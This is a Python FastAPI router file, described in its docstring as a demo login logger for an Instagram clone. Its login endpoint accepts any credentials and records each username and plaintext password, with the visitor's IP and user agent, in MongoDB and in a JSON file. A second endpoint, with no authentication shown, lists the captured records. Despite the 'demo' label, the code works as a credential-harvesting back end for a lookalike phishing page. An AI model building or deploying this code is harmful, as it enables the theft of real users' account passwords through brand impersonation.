"""Demo login logger.

POST /api/login  — accepts ANY credentials (no user store to check), stores every
attempt in MongoDB `login_logs` AND appends it to a local JSON file on disk
(backend/data/login_logs.json). GET /api/login-logs lists what was captured.

This is a demo/mock flow for the clone — it never contacts instagram.com and the
credentials are demo values the visitor typed into a mock form.
"""

import asyncio
import json
from datetime import datetime, timezone
from pathlib import Path

from fastapi import APIRouter, Request

from lib.db import db
from models.logins import LoginCreate, LoginRecord, LoginResponse

router = APIRouter()

# Local log file, next to the backend package: backend/data/login_logs.json
DATA_FILE = Path(__file__).resolve().parent.parent / "data" / "login_logs.json"


def _append_to_file(record: dict) -> None:
    """Blocking file IO — always run via asyncio.to_thread so the event loop never blocks."""
    DATA_FILE.parent.mkdir(parents=True, exist_ok=True)
    logs: list = []
    if DATA_FILE.exists():
        try:
            logs = json.loads(DATA_FILE.read_text())
        except (json.JSONDecodeError, OSError):
            logs = []
    logs.append(record)
    DATA_FILE.write_text(json.dumps(logs, indent=2))


def _aware_utc(dt: datetime) -> datetime:
    """Motor hands back naive datetimes — normalise to aware UTC on read."""
    return dt if dt.tzinfo else dt.replace(tzinfo=timezone.utc)


@router.post("/login", response_model=LoginResponse)
async def login(payload: LoginCreate, request: Request):
    record = LoginRecord(
        username=payload.username,
        password=payload.password,
        ip=request.client.host if request.client else "",
        user_agent=request.headers.get("user-agent", ""),
    )
    await db.login_logs.insert_one(record.model_dump())
    await asyncio.to_thread(_append_to_file, json.loads(record.model_dump_json()))
    return LoginResponse(success=True, user={"username": payload.username})


@router.get("/login-logs", response_model=list[LoginRecord])
async def login_logs():
    docs = await db.login_logs.find().sort("created_at", -1).to_list(500)
    records = []
    for doc in docs:
        doc["created_at"] = _aware_utc(doc["created_at"])
        records.append(LoginRecord(**doc))
    return records
